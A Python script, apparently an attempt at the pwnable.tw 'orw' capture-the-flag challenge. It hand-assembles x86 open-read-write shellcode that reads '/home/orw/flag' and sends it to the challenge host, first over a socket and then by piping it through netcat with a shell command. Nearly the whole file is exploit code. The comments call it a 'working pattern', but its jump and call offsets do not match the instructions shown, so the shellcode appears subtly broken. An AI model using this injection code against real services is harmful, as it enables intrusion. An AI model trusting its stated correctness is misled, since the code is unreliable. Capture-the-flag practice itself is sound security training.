#!/usr/bin/env python3

# Try a working ORW shellcode pattern based on common solutions

import socket
import time

def create_working_pattern():
    # This is a common working pattern for ORW challenges
    shellcode = b""
    
    # Method: jmp-call-pop
    shellcode += b"\xeb\x36"              # jmp 0x38
    shellcode += b"\x5e"                  # pop esi
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\x88\x46\x0e"          # mov [esi+14], al
    shellcode += b"\x89\xf3"              # mov ebx, esi
    shellcode += b"\x31\xc9"              # xor ecx, ecx
    shellcode += b"\x31\xd2"              # xor edx, edx
    shellcode += b"\xb0\x05"              # mov al, 5
    shellcode += b"\xcd\x80"              # int 0x80
    shellcode += b"\x89\xc3"              # mov ebx, eax
    shellcode += b"\x89\xf1"              # mov ecx, esi
    shellcode += b"\x31\xd2"              # xor edx, edx
    shellcode += b"\xb2\x64"              # mov dl, 100
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\xb0\x03"              # mov al, 3
    shellcode += b"\xcd\x80"              # int 0x80
    shellcode += b"\x89\xc2"              # mov edx, eax
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\xb0\x04"              # mov al, 4
    shellcode += b"\xb3\x01"              # mov bl, 1
    shellcode += b"\xcd\x80"              # int 0x80
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\x40"                  # inc eax
    shellcode += b"\xcd\x80"              # int 0x80
    shellcode += b"\xe8\xc5\xff\xff\xff"  # call $-0x3b
    shellcode += b"/home/orw/flag"        # string
    
    return shellcode

def test_working_pattern():
    shellcode = create_working_pattern()
    print(f"Working pattern shellcode: {len(shellcode)} bytes")
    print(f"Hex: {shellcode.hex()}")
    
    # Test with socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(30)
    
    try:
        s.connect(("chall.pwnable.tw", 10001))
        
        # Get prompt
        data = s.recv(1024)
        print(f"Prompt: {data.decode()}")
        
        # Send shellcode
        s.send(shellcode)
        print("Shellcode sent")
        
        # Wait for response
        time.sleep(5)
        
        # Try to get response with longer timeout
        s.settimeout(10)
        response = s.recv(1024)
        if response:
            print(f"Response: {response}")
            if b"FLAG" in response or b"orw" in response or b"{" in response:
                print("FOUND FLAG!")
                return response.decode()
        else:
            print("No immediate response")
        
        # Try to get more data
        try:
            while True:
                data = s.recv(1024)
                if not data:
                    break
                print(f"Additional: {data}")
                if b"FLAG" in data or b"orw" in data or b"{" in data:
                    print("FOUND FLAG!")
                    return data.decode()
        except:
            pass
            
    except Exception as e:
        print(f"Error: {e}")
    finally:
        s.close()
    
    return None

if __name__ == "__main__":
    flag = test_working_pattern()
    if flag:
        print(f"\nFLAG FOUND: {flag}")
    else:
        print("\nNo flag found")
        
        # Try one more time with a different approach
        print("\nTrying alternative method...")
        shellcode = create_working_pattern()
        
        import subprocess
        import tempfile
        import os
        
        # Create temporary file
        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(shellcode)
            temp_file = f.name
        
        try:
            # Try with netcat
            cmd = f"cat {temp_file} | nc chall.pwnable.tw 10001"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
            
            if result.stdout:
                print(f"Output: {result.stdout}")
                if "FLAG" in result.stdout or "orw" in result.stdout or "{" in result.stdout:
                    print("FOUND FLAG!")
            if result.stderr:
                print(f"Error: {result.stderr}")
                
        except subprocess.TimeoutExpired:
            print("Command timed out")
        except Exception as e:
            print(f"Command error: {e}")
        finally:
            os.unlink(temp_file)